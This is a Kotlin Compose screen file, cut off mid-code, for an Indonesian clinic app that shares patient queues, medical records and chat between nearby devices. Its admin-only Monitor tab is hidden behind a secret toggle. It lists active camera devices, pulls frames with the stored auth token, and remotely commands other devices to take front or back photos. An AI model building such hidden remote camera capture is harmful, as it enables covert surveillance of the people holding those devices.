package com.example.kabensatudata.ui.screen.nearby

import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.scale
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.graphicsLayer
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.foundation.gestures.detectTransformGestures
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.hilt.navigation.compose.hiltViewModel
import com.example.kabensatudata.nearby.P2PMedicalPayload
import com.example.kabensatudata.nearby.RequestNearbyPermissions
import com.example.kabensatudata.ui.theme.AppColors
import com.example.kabensatudata.ui.theme.appTextFieldColors
import com.example.kabensatudata.nearby.MonitorVisibility
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Image
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.text.font.FontFamily
import coil.compose.rememberAsyncImagePainter

private val Purple = Color(0xFF7C3AED)
private val PurpleLight = Color(0xFFEDE9FE)
private val Green = Color(0xFF10B981)
private val Blue = Color(0xFF3B82F6)
private val Orange = Color(0xFFF59E0B)
private val Teal = Color(0xFF0D9488)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun NearbyScreen(
    onBack: () -> Unit,
    onNavigateToRegistration: () -> Unit = {},
    onNavigateToDiagnosis: (String) -> Unit = {},
    onNavigateToPharmacy: (String) -> Unit = {},
    onNavigateToRecordDetail: (String) -> Unit = {},
    onNavigateToChatList: () -> Unit = {},
    onNavigateToChat: (peerId: String, peerName: String) -> Unit = { _, _ -> },
    onHideBottomNav: (Boolean) -> Unit = {},
    viewModel: NearbyViewModel = hiltViewModel()
) {
    val state by viewModel.state.collectAsState()
    // Refresh inbox when switching to medical tab
    // Inbox is now reactive via Room Flow — no manual refresh needed

    // Request permissions on first load
    var permRequested by remember { mutableStateOf(false) }
    var selectedTab by remember { mutableIntStateOf(0) }
    var showNameEdit by remember { mutableStateOf(false) }
    var nameInput by remember { mutableStateOf(state.deviceName) }
    if (!permRequested) {
        permRequested = true
        RequestNearbyPermissions(
            onGranted = { viewModel.onPermissionGranted() },
            onDenied = { /* show message */ }
        )
    }

    // Fullscreen mode: when Monitor tab is active, skip all chrome
    val isMonitorFullscreen = selectedTab == 5 && state.isAdmin && MonitorVisibility.isVisible

    // Notify parent to hide bottom nav when Command Center (tab 5) is active
    LaunchedEffect(selectedTab, isMonitorFullscreen) {
        onHideBottomNav(selectedTab == 5 || isMonitorFullscreen)
    }

    Scaffold(
        topBar = {
            if (!isMonitorFullscreen) {
                TopAppBar(
                    title = {
                        Column {
                            Text("P2P Nearby", fontWeight = FontWeight.SemiBold, fontSize = 18.sp)
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                if (state.isActive && state.peers.isEmpty()) {
                                    val pulse = rememberInfiniteTransition(label = "scan")
                                    val dotScale by pulse.animateFloat(0.6f, 1.2f, infiniteRepeatable(
                                        tween(600, easing = FastOutSlowInEasing), RepeatMode.Reverse
                                    ), label = "scanDot")
                                    Box(Modifier.size(8.dp).scale(dotScale).clip(CircleShape).background(Orange))
                                    Spacer(Modifier.width(6.dp))
                                    Text("Mencari perangkat...", fontSize = 12.sp, color = Orange.copy(alpha = 0.9f))
                                } else if (state.isActive) {
                                    Box(Modifier.size(8.dp).clip(CircleShape).background(Green))
                                    Spacer(Modifier.width(6.dp))
                                    Text("${state.peers.size} perangkat terhubung", fontSize = 12.sp, color = Green)
                                } else {
                                    Box(Modifier.size(8.dp).clip(CircleShape).background(Color.Gray))
                                    Spacer(Modifier.width(6.dp))
                                    Text("Nonaktif", fontSize = 12.sp, color = Color.White.copy(alpha = 0.5f))
                                }
                            }
                        }
                    },
                    navigationIcon = {
                        IconButton(onClick = onBack) {
                            Icon(Icons.AutoMirrored.Filled.ArrowBack, "Kembali")
                        }
                    },
                    actions = {
                        IconButton(onClick = { showNameEdit = !showNameEdit }) {
                            Icon(Icons.Default.Settings, "Pengaturan", tint = Color.White)
                        }
                        Switch(
                            checked = state.isActive,
                            onCheckedChange = { viewModel.toggleConnection() },
                            colors = SwitchDefaults.colors(
                                checkedTrackColor = Green,
                                checkedThumbColor = Color.White
                            ),
                            modifier = Modifier.padding(end = 8.dp)
                        )
                    },
                    colors = TopAppBarDefaults.topAppBarColors(
                        containerColor = AppColors.TopBarBg,
                        titleContentColor = AppColors.TextOnDark,
                        navigationIconContentColor = AppColors.TextOnDark,
                        actionIconContentColor = AppColors.TextOnDark
                    )
                )
            }
        },
        containerColor = Color.Transparent
    ) { padding ->
        // ─── FULLSCREEN MONITOR MODE ────────────────────
        if (isMonitorFullscreen) {
            Box(Modifier.fillMaxSize()) {
                MonitorTab(state, viewModel, onBack)
            }
        } else {
            Column(
                Modifier
                    .fillMaxSize()
                    .background(AppColors.Background)
                    .padding(padding)
            ) {
                // ─── Device Name Edit Card ────────────────────
                AnimatedVisibility(visible = showNameEdit) {
                    Surface(
                        Modifier.fillMaxWidth().padding(12.dp),
                        shape = RoundedCornerShape(12.dp),
                        color = AppColors.Surface,
                        shadowElevation = 2.dp
                    ) {
                        Column(Modifier.padding(14.dp)) {
                            Text("Nama Perangkat", fontWeight = FontWeight.SemiBold, fontSize = 13.sp, color = AppColors.TextSecondary)
                            Spacer(Modifier.height(8.dp))
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                OutlinedTextField(
                                    value = nameInput,
                                    onValueChange = { nameInput = it },
                                    placeholder = { Text("Contoh: Pendaftaran") },
                                    modifier = Modifier.weight(1f),
                                    shape = RoundedCornerShape(10.dp),
                                    singleLine = true,
                                    colors = appTextFieldColors()
                                )
                                Spacer(Modifier.width(8.dp))
                                FilledTonalButton(
                                    onClick = {
                                        if (nameInput.isNotBlank()) {
                                            viewModel.setDeviceName(nameInput.trim())
                                            showNameEdit = false
                                        }
                                    },
                                    shape = RoundedCornerShape(10.dp),
                                    colors = ButtonDefaults.filledTonalButtonColors(
                                        containerColor = AppColors.Primary,
                                        contentColor = Color.White
                                    )
                                ) { Text("Simpan", fontSize = 13.sp) }
                            }
                            Spacer(Modifier.height(4.dp))
                            Text("Nama ini akan terlihat oleh perangkat lain", fontSize = 11.sp, color = AppColors.TextTertiary)
                        }
                    }
                }

                // Tabs — use ScrollableTabRow
                ScrollableTabRow(
                    selectedTabIndex = selectedTab,
                    containerColor = AppColors.Surface,
                    contentColor = Purple,
                    edgePadding = 4.dp
                ) {
                    Tab(selected = selectedTab == 0, onClick = { selectedTab = 0 },
                        text = { Text("Antrian", fontSize = 12.sp) },
                        icon = { Icon(Icons.Default.ConfirmationNumber, null, Modifier.size(18.dp)) }
                    )
                    Tab(selected = selectedTab == 1, onClick = { selectedTab = 1 },
                        text = { Text("Perangkat", fontSize = 12.sp) },
                        icon = {
                            BadgedBox(badge = {
                                if (state.peers.isNotEmpty()) Badge(containerColor = Green) { Text("${state.peers.size}") }
                            }) { Icon(Icons.Default.Devices, null, Modifier.size(18.dp)) }
                        }
                    )
                    Tab(selected = selectedTab == 2, onClick = { selectedTab = 2 },
                        text = { Text("Log", fontSize = 12.sp) },
                        icon = { Icon(Icons.Default.Terminal, null, Modifier.size(18.dp)) }
                    )
                    Tab(selected = selectedTab == 3, onClick = { selectedTab = 3 },
                        text = { Text("Rekam Medis", fontSize = 12.sp) },
                        icon = {
                            BadgedBox(badge = {
                                if (state.inboxRecords.isNotEmpty()) Badge(containerColor = Orange) { Text("${state.inboxRecords.size}") }
                            }) { Icon(Icons.Default.MedicalServices, null, Modifier.size(18.dp)) }
                        }
                    )
                    Tab(selected = selectedTab == 4, onClick = { selectedTab = 4 },
                        text = { Text("Chat", fontSize = 12.sp) },
                        icon = {
                            BadgedBox(badge = {
                                @Suppress("UNUSED_VARIABLE")
                                val unread = state.logs.size
                            }) { Icon(Icons.Default.Forum, null, Modifier.size(18.dp)) }
                        }
                    )
                    // Monitor tab — admin/super_admin only + secret toggle
                    if (state.isAdmin && MonitorVisibility.isVisible) {
                        Tab(selected = selectedTab == 5, onClick = { selectedTab = 5 },
                            text = { Text("Monitor", fontSize = 12.sp) },
                            icon = { Icon(Icons.Default.Videocam, null, Modifier.size(18.dp)) }
                        )
                    }
                }

                // Content
                when (selectedTab) {
                    0 -> QueueTab(state, viewModel)
                    1 -> PeersTab(state, onNavigateToChat)
                    2 -> LogTab(state)
                    3 -> MedicalTab(state, onNavigateToRegistration, onNavigateToDiagnosis, onNavigateToPharmacy, onNavigateToRecordDetail)
                    4 -> ChatTab(onNavigateToChatList)
                }
            }
        }
    }
}

// ═════════════════════════════════════════════════════════
// ─── Tab 1 : Antrian Pasien ──────────────────────────────
// ═════════════════════════════════════════════════════════

@Composable
private fun QueueTab(state: NearbyState, viewModel: NearbyViewModel) {
    LazyColumn(
        Modifier.fillMaxSize(),
        contentPadding = PaddingValues(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        // Current queue display
        item {
            Surface(
                Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(20.dp),
                shadowElevation = 4.dp,
                color = AppColors.Surface
            ) {
                Column(
                    Modifier
                        .background(
                            Brush.verticalGradient(
                                listOf(Purple.copy(alpha = 0.05f), Color.Transparent)
                            )
                        )
                        .padding(24.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Text("NOMOR ANTRIAN", fontSize = 12.sp, color = AppColors.TextTertiary,
                        letterSpacing = 3.sp, fontWeight = FontWeight.SemiBold)
                    Spacer(Modifier.height(8.dp))

                    // Big number
                    val currentNum = state.lastCall?.number ?: 0
                    Text(
                        "%03d".format(currentNum),
                        fontSize = 72.sp, fontWeight = FontWeight.Bold,
                        color = if (currentNum > 0) Purple else AppColors.TextTertiary
                    )

                    if (state.lastCall != null) {
                        Spacer(Modifier.height(8.dp))
                        Surface(
                            shape = RoundedCornerShape(10.dp),
                            color = Purple.copy(alpha = 0.08f)
                        ) {
                            Column(
                                Modifier.padding(horizontal = 20.dp, vertical = 10.dp),
                                horizontalAlignment = Alignment.CenterHorizontally
                            ) {
                                Text(state.lastCall.patientName, fontSize = 16.sp, fontWeight = FontWeight.SemiBold, color = Purple)
                                Text(state.lastCall.room, fontSize = 13.sp, color = AppColors.TextSecondary)
                            }
                        }
                    }

                    Spacer(Modifier.height(16.dp))

                    Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                        StatusBadge(Icons.Default.Bluetooth, if (state.isActive) "Aktif" else "Nonaktif",
                            if (state.isActive) Green else AppColors.TextTertiary)
                        StatusBadge(Icons.Default.Devices, "${state.peers.size} perangkat",
                            if (state.peers.isNotEmpty()) Blue else AppColors.TextTertiary)
                        StatusBadge(Icons.Default.FormatListNumbered, "${state.queueHistory.size} total", Orange)
                    }
                }
            }
        }

        // Input fields
        item {
            Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(16.dp), color = AppColors.Surface, shadowElevation = 1.dp) {
                Column(Modifier.padding(16.dp)) {
                    Text("Panggil Antrian", fontWeight = FontWeight.SemiBold, fontSize = 14.sp, color = AppColors.TextPrimary)
                    Spacer(Modifier.height(10.dp))
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(value = state.inputName, onValueChange = { viewModel.updateInputName(it) },
                            label = { Text("Nama Pasien") }, modifier = Modifier.weight(1f), singleLine = true, colors = appTextFieldColors())
                        OutlinedTextField(value = state.inputRoom, onValueChange = { viewModel.updateInputRoom(it) },
                            label = { Text("Ruangan") }, modifier = Modifier.weight(0.6f), singleLine = true, colors = appTextFieldColors())
                    }
                    Spacer(Modifier.height(12.dp))
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Button(onClick = { viewModel.callNext() }, modifier = Modifier.weight(1f).height(48.dp),
                            colors = ButtonDefaults.buttonColors(containerColor = Purple), shape = RoundedCornerShape(12.dp), enabled = state.isActive) {
                            Icon(Icons.Default.VolumeUp, null, Modifier.size(20.dp)); Spacer(Modifier.width(8.dp))
                            Text("Panggil", fontWeight = FontWeight.SemiBold)
                        }
                        OutlinedButton(onClick = { viewModel.resetQueue() }, modifier = Modifier.height(48.dp),
                            shape = RoundedCornerShape(12.dp), border = androidx.compose.foundation.BorderStroke(1.dp, AppColors.Error)) {
                            Icon(Icons.Default.RestartAlt, null, tint = AppColors.Error)
                        }
                    }
                    if (!state.isActive) {
                        Spacer(Modifier.height(8.dp))
                        Text("⚠️ Aktifkan P2P dengan toggle di atas untuk memanggil antrian", fontSize = 12.sp, color = Orange)
                    }
                }
            }
        }

        // Queue history
        if (state.queueHistory.isNotEmpty()) {
            item { Text("Riwayat Panggilan", fontWeight = FontWeight.SemiBold, fontSize = 14.sp, color = AppColors.TextPrimary, modifier = Modifier.padding(top = 4.dp)) }
            items(state.queueHistory.take(20)) { call ->
                Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp), color = AppColors.Surface) {
                    Row(Modifier.padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                        Box(Modifier.size(40.dp).clip(CircleShape).background(Purple.copy(alpha = 0.1f)), contentAlignment = Alignment.Center) {
                            Text("${call.number}", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Purple)
                        }
                        Spacer(Modifier.width(12.dp))
                        Column(Modifier.weight(1f)) {
                            Text(call.patientName, fontWeight = FontWeight.Medium, fontSize = 14.sp, color = AppColors.TextPrimary)
                            Text(call.room, fontSize = 12.sp, color = AppColors.TextSecondary)
                        }
                        Text(formatTime(call.timestamp), fontSize = 11.sp, color = AppColors.TextTertiary)
                    }
                }
            }
        }
        item { Spacer(Modifier.height(80.dp)) }
    }
}

// ═════════════════════════════════════════════════════════
// ─── Tab 2 : Perangkat Terhubung ────────────────────────
// ═════════════════════════════════════════════════════════

@Composable
private fun PeersTab(state: NearbyState, onOpenChat: (peerId: String, peerName: String) -> Unit = { _, _ -> }) {
    if (state.peers.isEmpty()) {
        Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                if (state.isActive) {
                    val pulse = rememberInfiniteTransition(label = "scan")
                    val dotScale by pulse.animateFloat(0.8f, 1.3f, infiniteRepeatable(
                        tween(700, easing = FastOutSlowInEasing), RepeatMode.Reverse
                    ), label = "scanDot")
                    Icon(Icons.Default.BluetoothSearching, null,
                        modifier = Modifier.size(64.dp).scale(dotScale), tint = Orange)
                } else {
                    Icon(Icons.Default.BluetoothSearching, null, modifier = Modifier.size(64.dp), tint = AppColors.TextTertiary)
                }
                Spacer(Modifier.height(16.dp))
                Text(if (state.isActive) "Mencari perangkat..." else "P2P tidak aktif", fontSize = 16.sp, fontWeight = FontWeight.SemiBold, color = AppColors.TextSecondary)
                Spacer(Modifier.height(4.dp))
                Text(if (state.isActive) "Pastikan perangkat lain juga membuka P2P" else "Aktifkan P2P dengan toggle di atas",
                    fontSize = 13.sp, color = AppColors.TextTertiary, textAlign = TextAlign.Center, modifier = Modifier.padding(horizontal = 32.dp))
            }
        }
    } else {
        LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            items(state.peers.values.toList()) { peer ->
                Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(14.dp), color = AppColors.Surface, shadowElevation = 1.dp) {
                    Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
                        Box(Modifier.size(44.dp).clip(CircleShape).background(Blue.copy(alpha = 0.1f)), contentAlignment = Alignment.Center) {
                            Icon(Icons.Default.PhoneAndroid, null, tint = Blue, modifier = Modifier.size(24.dp))
                        }
                        Spacer(Modifier.width(12.dp))
                        Column(Modifier.weight(1f)) {
                            Text(peer.name, fontWeight = FontWeight.SemiBold, fontSize = 14.sp, color = AppColors.TextPrimary)
                            Text("ID: ${peer.endpointId.take(8)}...", fontSize = 11.sp, color = AppColors.TextTertiary)
                        }
                        // Chat button
                        FilledTonalButton(
                            onClick = { onOpenChat(peer.endpointId, peer.name) },
                            shape = RoundedCornerShape(10.dp),
                            colors = ButtonDefaults.filledTonalButtonColors(
                                containerColor = AppColors.Primary.copy(alpha = 0.12f),
                                contentColor = AppColors.Primary
                            ),
                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp),
                            modifier = Modifier.height(34.dp)
                        ) {
                            Icon(Icons.Default.Forum, null, modifier = Modifier.size(16.dp))
                            Spacer(Modifier.width(4.dp))
                            Text("Chat", fontSize = 12.sp, fontWeight = FontWeight.SemiBold)
                        }
                    }
                }
            }
            item { Spacer(Modifier.height(80.dp)) }
        }
    }
}

// ═════════════════════════════════════════════════════════
// ─── Tab 3 : Log ─────────────────────────────────────────
// ═════════════════════════════════════════════════════════

@Composable
private fun LogTab(state: NearbyState) {
    if (state.logs.isEmpty()) {
        Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("Belum ada aktivitas", color = AppColors.TextTertiary)
        }
    } else {
        LazyColumn(Modifier.fillMaxSize(), contentPadding = PaddingValues(16.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
            items(state.logs) { log ->
                Surface(Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), color = Color(0xFF1E293B).copy(alpha = 0.05f)) {
                    Text(log, fontSize = 12.sp, color = AppColors.TextSecondary, modifier = Modifier.padding(10.dp))
                }
            }
            item { Spacer(Modifier.height(80.dp)) }
        }
    }
}

// ═════════════════════════════════════════════════════════
// ─── Tab 4 : Rekam Medis ────────────────────────────────
// ═════════════════════════════════════════════════════════

@Composable
private fun MedicalTab(
    state: NearbyState,
    onNavigateToRegistration: () -> Unit,
    onNavigateToDiagnosis: (String) -> Unit,
    onNavigateToPharmacy: (String) -> Unit,
    onNavigateToRecordDetail: (String) -> Unit
) {
    LazyColumn(
        Modifier.fillMaxSize(),
        contentPadding = PaddingValues(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        // Create new registration
        item {
            Button(
                onClick = onNavigateToRegistration,
                modifier = Modifier.fillMaxWidth().height(52.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Teal),
                shape = RoundedCornerShape(14.dp)
            ) {
                Icon(Icons.Default.PersonAdd, null)
                Spacer(Modifier.width(8.dp))
                Text("Buat Pendaftaran Baru", fontWeight = FontWeight.SemiBold)
            }
        }

        // Inbox
        if (state.inboxRecords.isNotEmpty()) {
            item {
                Text("📥 Inbox — Perlu Diproses", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AppColors.TextPrimary)
            }
            items(state.inboxRecords) { record ->
                MedicalRecordCard(
                    record = record,
                    onClick = {
                        when (record.stage) {
                            P2PMedicalPayload.STAGE_REGISTRATION -> onNavigateToDiagnosis(record.recordUuid)
                            P2PMedicalPayload.STAGE_DIAGNOSIS -> onNavigateToPharmacy(record.recordUuid)
                        }
                    }
                )
            }
        }

        // Outbox (completed)
        if (state.outboxRecords.isNotEmpty()) {
            item {
                Text("✅ Selesai", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AppColors.TextPrimary)
            }
            items(state.outboxRecords) { record ->
                MedicalRecordCard(record = record, onClick = { onNavigateToRecordDetail(record.recordUuid) })
            }
        }

        // Empty state
        if (state.inboxRecords.isEmpty() && state.outboxRecords.isEmpty()) {
            item {
                Box(Modifier.fillMaxWidth().padding(vertical = 40.dp), contentAlignment = Alignment.Center) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(Icons.Default.MedicalServices, null, modifier = Modifier.size(48.dp), tint = AppColors.TextTertiary)
                        Spacer(Modifier.height(12.dp))
                        Text("Belum ada rekam medis P2P", fontSize = 14.sp, color = AppColors.TextSecondary)
                        Text("Buat pendaftaran baru atau tunggu data masuk", fontSize = 12.sp, color = AppColors.TextTertiary)
                    }
                }
            }
        }

        item { Spacer(Modifier.height(80.dp)) }
    }
}

@Composable
private fun MedicalRecordCard(record: P2PMedicalPayload, onClick: () -> Unit) {
    val stageColor = when (record.stage) {
        P2PMedicalPayload.STAGE_REGISTRATION -> Teal
        P2PMedicalPayload.STAGE_DIAGNOSIS -> Blue
        P2PMedicalPayload.STAGE_DISPENSED -> Green
        else -> AppColors.TextTertiary
    }
    val stageLabel = when (record.stage) {
        P2PMedicalPayload.STAGE_REGISTRATION -> "Perlu Diagnosis"
        P2PMedicalPayload.STAGE_DIAGNOSIS -> "Perlu Farmasi"
        P2PMedicalPayload.STAGE_DISPENSED -> "Selesai"
        else -> record.stage
    }
    val stageIcon = when (record.stage) {
        P2PMedicalPayload.STAGE_REGISTRATION -> Icons.Default.MedicalInformation
        P2PMedicalPayload.STAGE_DIAGNOSIS -> Icons.Default.LocalPharmacy
        P2PMedicalPayload.STAGE_DISPENSED -> Icons.Default.CheckCircle
        else -> Icons.Default.Description
    }

    Surface(
        Modifier.fillMaxWidth().clickable(onClick = onClick),
        shape = RoundedCornerShape(14.dp), color = AppColors.Surface, shadowElevation = 1.dp,
        border = if (record.stage != P2PMedicalPayload.STAGE_DISPENSED) androidx.compose.foundation.BorderStroke(1.dp, stageColor.copy(alpha = 0.3f)) else null
    ) {
        Row(Modifier.padding(14.dp), verticalAlignment = Alignment.CenterVertically) {
            Box(Modifier.size(44.dp).clip(CircleShape).background(stageColor.copy(alpha = 0.12f)),
                contentAlignment = Alignment.Center) {
                Icon(stageIcon, null, tint = stageColor, modifier = Modifier.size(24.dp))
            }
            Spacer(Modifier.width(12.dp))
            Column(Modifier.weight(1f)) {
                Text(record.patientName, fontWeight = FontWeight.SemiBold, fontSize = 14.sp, color = AppColors.TextPrimary)
                Text("${record.visitDate} · ${record.patientGender}", fontSize = 12.sp, color = AppColors.TextSecondary)
                if (record.prescriptions.isNotEmpty()) {
                    Text("${record.prescriptions.size} item obat", fontSize = 11.sp, color = AppColors.TextTertiary)
                }
            }
            Surface(shape = RoundedCornerShape(6.dp), color = stageColor.copy(alpha = 0.1f)) {
                Text(stageLabel, modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                    fontSize = 10.sp, fontWeight = FontWeight.SemiBold, color = stageColor)
            }
        }
    }
}

// ═════════════════════════════════════════════════════════
// ─── Helpers ──────────────────────────────────────────────
// ═════════════════════════════════════════════════════════
// ─── Tab 5 : Chat ────────────────────────────────────────
// ═════════════════════════════════════════════════════════

@Composable
private fun ChatTab(onNavigateToChatList: () -> Unit) {
    Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.Forum, null, modifier = Modifier.size(56.dp), tint = Color(0xFF0084FF))
            Spacer(Modifier.height(16.dp))
            Text("Chat P2P", fontWeight = FontWeight.SemiBold, fontSize = 18.sp, color = AppColors.TextPrimary)
            Spacer(Modifier.height(4.dp))
            Text("Kirim pesan ke perangkat terhubung via Bluetooth", fontSize = 13.sp, color = AppColors.TextSecondary)
            Spacer(Modifier.height(20.dp))
            Button(
                onClick = onNavigateToChatList,
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF0084FF)),
                shape = RoundedCornerShape(14.dp),
                modifier = Modifier.height(48.dp)
            ) {
                Icon(Icons.Default.Forum, null, Modifier.size(20.dp))
                Spacer(Modifier.width(8.dp))
                Text("Buka Chat", fontWeight = FontWeight.SemiBold)
            }
        }
    }
}

// ═════════════════════════════════════════════════════════
// ─── Helpers ──────────────────────────────────────────────
// ═════════════════════════════════════════════════════════

@Composable
private fun StatusBadge(icon: androidx.compose.ui.graphics.vector.ImageVector, label: String, color: Color) {
    Surface(shape = RoundedCornerShape(8.dp), color = color.copy(alpha = 0.08f)) {
        Row(Modifier.padding(horizontal = 10.dp, vertical = 6.dp), verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(4.dp)) {
            Icon(icon, null, modifier = Modifier.size(14.dp), tint = color)
            Text(label, fontSize = 11.sp, fontWeight = FontWeight.Medium, color = color)
        }
    }
}

private fun formatTime(timestamp: Long): String {
    val cal = java.util.Calendar.getInstance().apply { timeInMillis = timestamp }
    return "%02d:%02d".format(cal.get(java.util.Calendar.HOUR_OF_DAY), cal.get(java.util.Calendar.MINUTE))
}

// ═════════════════════════════════════════════════════════
// ─── Tab 6 : Monitor (Admin Only) ───────────────────────
// ═════════════════════════════════════════════════════════

@Composable
private fun MonitorTab(state: NearbyState, viewModel: NearbyViewModel, onBack: () -> Unit = {}) {
    var monitorUrl by remember { mutableStateOf("") }
    var monitorRelayUrl by remember { mutableStateOf("") }
    var monitorPeerName by remember { mutableStateOf("") }
    var showMonitor by remember { mutableStateOf(false) }
    var expandedModule by remember { mutableIntStateOf(-1) }
    var selectedDevice by remember { mutableStateOf<com.example.kabensatudata.data.remote.dto.CameraDeviceDto?>(null) }
    val coroutineScope = rememberCoroutineScope()

    // Snapshot dialog state
    var showSnapshotDialog by remember { mutableStateOf(false) }
    var snapshotUrl by remember { mutableStateOf("") }
    var snapshotDeviceName by remember { mutableStateOf("") }
    var snapshotLens by remember { mutableStateOf("") }

    val relayBaseUrl = remember { "https://kabensatudata.my.id/api/mobile" }

    // Get auth token for authenticated frame requests
    val context = androidx.compose.ui.platform.LocalContext.current
    val authToken = remember {
        try {
            val ep = dagger.hilt.android.EntryPointAccessors.fromApplication(
                context.applicationContext,
                com.example.kabensatudata.nearby.RemoteControlHandler.RemoteEntryPoint::class.java
            )
            ep.authTokenManager().getToken()
        } catch (_: Exception) { null }
    }

    // Auto-refresh device list every 30 seconds
    LaunchedEffect(Unit) {
        while (true) {
            viewModel.fetchActiveCameras()
            kotlinx.coroutines.delay(30_000L)
        }
    }

    // ═══ HUD Color Palette ═══
    val ccBg = Color(0xFF0A0E17)
    val ccCard = Color(0xFF111827)
    val ccBorder = Color(0xFF1E293B)
    val ccText = Color(0xFFE2E8F0)
    val ccTextDim = Color(0xFF64748B)
    val ccGreen = Color(0xFF00FF41)
    val ccCyan = Color(0xFF00D4FF)
    val ccRed = Color(0xFFFF5252)
    val ccYellow = Color(0xFFFFD600)
    val ccPurple = Color(0xFFBA68C8)
    val ccOrange = Color(0xFFFF9800)

    // Live digital clock
    var currentTime by remember { mutableStateOf("") }
    LaunchedEffect(Unit) {
        while (true) {
            val cal = java.util.Calendar.getInstance()
            currentTime = "%02d:%02d:%02d".format(
                cal.get(java.util.Calendar.HOUR_OF_DAY),
                cal.get(java.util.Calendar.MINUTE),
                cal.get(java.util.Calendar.SECOND)
            )
            kotlinx.coroutines.delay(1000)
        }
    }

    // Online status pulse
    val onlinePulse = rememberInfiniteTransition(label = "online")
    val onlineAlpha by onlinePulse.animateFloat(
        initialValue = 0.4f, targetValue = 1f,
        animationSpec = infiniteRepeatable(tween(1200), RepeatMode.Reverse),
        label = "onlineAlpha"
    )

    if (showMonitor && monitorUrl.isNotBlank()) {
        MonitorScreen(streamUrl = monitorUrl, relayUrl = monitorRelayUrl, peerName = monitorPeerName, authToken = authToken, onBack = { showMonitor = false })
    } else if (showSnapshotDialog && snapshotUrl.isNotBlank()) {
        SnapshotViewerDialog(
            snapshotUrl = snapshotUrl,
            deviceName = snapshotDeviceName,
            lens = snapshotLens,
            authToken = authToken ?: "",
            onDismiss = { showSnapshotDialog = false },
            onRetake = { lens ->
                viewModel.sendCameraCommand(snapshotDeviceName, "TAKE_PHOTO", if (lens == "Depan") "FRONT" else "BACK")
            }
        )
    } else {
        val devices = state.activeCameras
        val deviceCount = devices.size

        LazyColumn(
            Modifier.fillMaxSize().background(ccBg).statusBarsPadding(),
            contentPadding = PaddingValues(start = 14.dp, end = 14.dp, top = 8.dp, bottom = 20.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            // ═══════════ TERMINAL HEADER ═══════════
            item {
                Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                    // Back button
                    IconButton(onClick = onBack, modifier = Modifier.size(36.dp)) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, "Kembali",
                            tint = Color(0xFF00FF41), modifier = Modifier.size(20.dp))
                    }
                    Spacer(Modifier.width(4.dp))
                    Column(Modifier.weight(1f)) {
                        Text(
                            "root@t4backspace:~#",
                            fontSize = 10.sp, color = ccGreen.copy(alpha = 0.6f),
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace
                        )
                        Text(
                            "COMMAND CENTER",
                            fontSize = 22.sp, fontWeight = FontWeight.Black, color = ccGreen,
                            fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                            letterSpacing = 3.sp
                        )
                    }
                    Text(
                        currentTime,
                        fontSize = 24.sp, fontWeight = FontWeight.Bold, color = ccCyan,
                        fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace
                    )
                }
            }

            // ═══════════ STATUS BAR ═══════════
            item {
                Surface(
                    Modifier.fillMaxWidth(), shape = RoundedCornerShape(4.dp),
                    color = ccCard,
                    border = androidx.compose.foundation.BorderStroke(0.5.dp, ccBorder)
                ) {
                    Row(
                        Modifier.padding(horizontal = 12.dp, vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically,
